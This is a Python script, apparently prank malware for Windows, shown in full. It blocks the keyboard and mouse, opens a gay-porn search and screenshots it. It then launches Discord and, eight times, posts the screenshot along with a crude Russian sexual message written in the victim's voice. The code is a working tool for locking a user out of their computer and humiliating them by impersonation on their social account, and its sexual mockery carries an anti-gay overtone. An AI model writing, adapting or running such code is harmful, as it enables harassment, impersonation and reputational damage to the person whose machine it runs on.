import sys
import keyboard as k
import time as t
import pathlib
import pygetwindow as gw
import os
import ctypes
import webbrowser
import pynput
import win32clipboard
from io import BytesIO
from PIL import ImageGrab

discord_path = pathlib.Path.home() / 'AppData' /'Local' /'Discord'
english_layout = 0x04090409
russian_layout = 0x04190419
block = [ "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "a", "s", "d", "f", "g", "h", "j", "k", "l",
    "z", "x", "c", "v", "b", "n", "m",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "shift", "windows", "alt", "esc", "backspace", "ctrl", "space"]

def change_language(language):
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    hkl = ctypes.windll.user32.LoadKeyboardLayoutW(hex(language), 1)
    ctypes.windll.user32.ActivateKeyboardLayout(hkl, 0x0001)
    ctypes.windll.user32.SendMessageW(hwnd, 0x0050, 0, hkl)

def sleep(time):
    t.sleep(time)

def press(button):
    k.send(button)
    sleep(1)

def write(text):
    k.write(text)
    sleep(1)

for key in block:
    k.block_key(key)
try:
    mouse_listener = pynput.mouse.Listener(suppress=True)
    mouse_listener.start()
    webbrowser.open_new(
        'https://www.google.com/search?q=gay+porn&oq=gay+porn&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCTQwMDNqMWoxNagCCLACAfEF3fBFpVp3MCbxBd3wRaVadzAm&sourceid=chrome&ie=UTF-8')
    sleep(3)
    screenshot = ImageGrab.grab()

    output = BytesIO()
    screenshot.convert('RGB').save(output, 'BMP')
    data = output.getvalue()[14:]
    output.close()

    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardData(win32clipboard.CF_DIB, data)
    win32clipboard.CloseClipboard()

    for file in discord_path.rglob("Discord.exe"):
        if os.path.exists(file):
            os.startfile(file)
            print("Запускаем Discord...")
            sleep(3)  # Даем время Discord запуститься
        else:
            discord_path = pathlib.Path('C:/')
            for file in discord_path.rglob("Discord.exe"):
                if os.path.exists(file):
                    os.startfile(file)
                else:
                    sys.exit(1)
        windows = gw.getWindowsWithTitle("Discord")  # Ищем окно с названием "Discord"
        if windows:
            discord_window = windows[0]  # Берем первое найденное окно
            discord_window.restore()  # Восстанавливаем окно, если оно свернуто
            discord_window.activate()  # Переводим окно на передний план
            change_language(russian_layout)
            sleep(2)
            for i in range(8):
                press('alt + down arrow')
                sleep(1.5)
                press('ctrl + v')
                press('enter')
                write('Я люблю, когда 40 мужиков запихивают мне члены в очко. Это просто фантастически.\n'
                      'Пишите мне в любое время. Всегда готов к новым ощущениям')
                press('enter')
                sleep(2)
            sleep(8)
        else:
            sys.exit(1)
except:
    sys.exit(1)